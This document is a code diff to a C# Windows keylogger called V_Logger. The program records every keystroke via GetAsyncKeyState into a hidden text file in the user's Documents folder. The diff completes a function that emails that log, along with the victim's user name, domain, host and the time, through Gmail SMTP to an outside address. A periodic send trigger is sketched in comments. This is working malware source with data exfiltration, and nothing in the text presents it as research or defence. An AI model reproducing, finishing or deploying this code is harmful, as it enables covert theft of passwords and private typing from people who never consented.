@@ -12,8 +12,8 @@ namespace V_Logger
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        //string to hold all of the keystrokes.
-        static string keyLog = "";
+        //counter for the keystrokes.
+        static long numberOfKeystrokes = 0;
 
         static void Main(string[] args)
         {
@@ -26,6 +26,8 @@ namespace V_Logger
             //setting the filder and filename.
             string path = (filePath + @"\strokes.txt");
 
+
+
             //check if the directory not exists, if not then create it.
             if (!Directory.Exists(filePath))
             {
@@ -33,7 +35,7 @@ namespace V_Logger
             }
 
             //if the file not exists in the directory then create a new text file.
-            if(!File.Exists(path))
+            if (!File.Exists(path))
             {
                 using (StreamWriter sw = File.CreateText(path)) { };
             }
@@ -57,15 +59,25 @@ namespace V_Logger
                     //store the log in textfile.
                     if (keyState == 32769)
                     {
-                        Console.Write((char) i + ", ");
+                        Console.Write((char)i + ", ");
 
                         using (StreamWriter sw = File.AppendText(path))
                         {
                             sw.Write((char)i);
                         };
+                        //increment keystrokes
+                        //not implementedfor now
+                        // numberOfKeystrokes++;
+
+                        //send every 100 char typed.
+                        //if (numberOfKeystrokes % 100 == 0)
+                        //{
+                        //    sendMessage();
+                        //}
+
                     }
 
-                }  
+                }
 
 
             }
@@ -73,14 +85,14 @@ namespace V_Logger
         }
 
         //send the txt file content periodically via email.
-        static void sendMessage() 
+        static void sendMessage()
         {
             //send the content of a text file to a mail address.
-            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
-            string path = (filePath + @"\strokes.txt");
+            string filepath = folderName + @"\strokes.txt";
 
-            string logContent = File.ReadAllText(filePath);
+            string logContent = File.ReadAllText(filepath);
 
 
             //create an E-mail message.
@@ -95,19 +107,23 @@ namespace V_Logger
             {
                 mailBody += "Address:" + address;
             }
-            mailBody += "\n User: " + Environment.UserDomainName + " // " + Environment.UserName;
+            mailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
             mailBody += "\n Host" + Host;
             mailBody += "\n Time: " + Now.ToString();
+            mailBody += logContent;
 
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage mailMessage = new MailMessage();
 
-            mailMessage.From = new MailAddress("v-Logger@gmail.com");
-            mailMessage.To.Add("vorago01@gmail.com");
+            mailMessage.From = new MailAddress("yourmail@gmail.com");
+            mailMessage.To.Add("v-Logger@gmail.com");
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
+            client.Credentials = new NetworkCredential("yourmail@gmail.com", "YourPassword");
+            mailMessage.Body = mailBody;
 
+            client.Send(mailMessage);
         }
     }
 }
